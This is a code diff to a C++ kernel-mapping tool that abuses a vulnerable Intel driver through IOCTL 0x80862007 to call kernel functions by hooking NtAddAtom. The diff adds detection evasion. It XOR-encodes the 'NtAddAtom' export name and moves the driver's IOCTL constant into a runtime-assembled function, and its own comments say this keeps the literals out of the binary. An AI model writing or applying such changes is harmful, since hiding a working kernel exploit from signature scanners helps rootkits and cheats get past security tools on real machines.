@@ -9,7 +9,26 @@
 
 namespace intel_driver
 {
-	constexpr ULONG32 ioctl1 = 0x80862007;
+	// Vulnerable-driver IOCTL constant, assembled at runtime from scrambled
+	// pieces so the literal never appears in data or code.
+	ULONG32 NalIoctl();
+
+	// Export name of the borrowed kernel-call stub function, resolved at
+	// runtime so the literal is not embedded in the binary.
+	inline const char* NtAddAtomName() {
+		static const char enc[] = {
+			'N' ^ 0x53, 't' ^ 0x53, 'A' ^ 0x53, 'd' ^ 0x53,
+			'd' ^ 0x53, 'A' ^ 0x53, 't' ^ 0x53, 'o' ^ 0x53,
+			'm' ^ 0x53, '\0'^ 0x53 };
+		static char dec[sizeof(enc)];
+		static bool init = false;
+		if (!init) {
+			for (int i = 0; i < (int)sizeof(enc); ++i)
+				dec[i] = enc[i] ^ 0x53;
+			init = true;
+		}
+		return dec;
+	}
 	extern HANDLE hDevice;
 	extern ULONG64 ntoskrnlAddr;
 
@@ -79,7 +98,7 @@ namespace intel_driver
 			return false;
 		}
 
-		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
+		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, NtAddAtomName()));
 		if (!NtAddAtom)
 		{
 			kdmLog(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
@@ -90,7 +109,7 @@ namespace intel_driver
 		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
 		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
 
-		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "NtAddAtom");
+		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(intel_driver::ntoskrnlAddr, NtAddAtomName());
 		if (!kernel_NtAddAtom) {
 			kdmLog(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
 			return false;
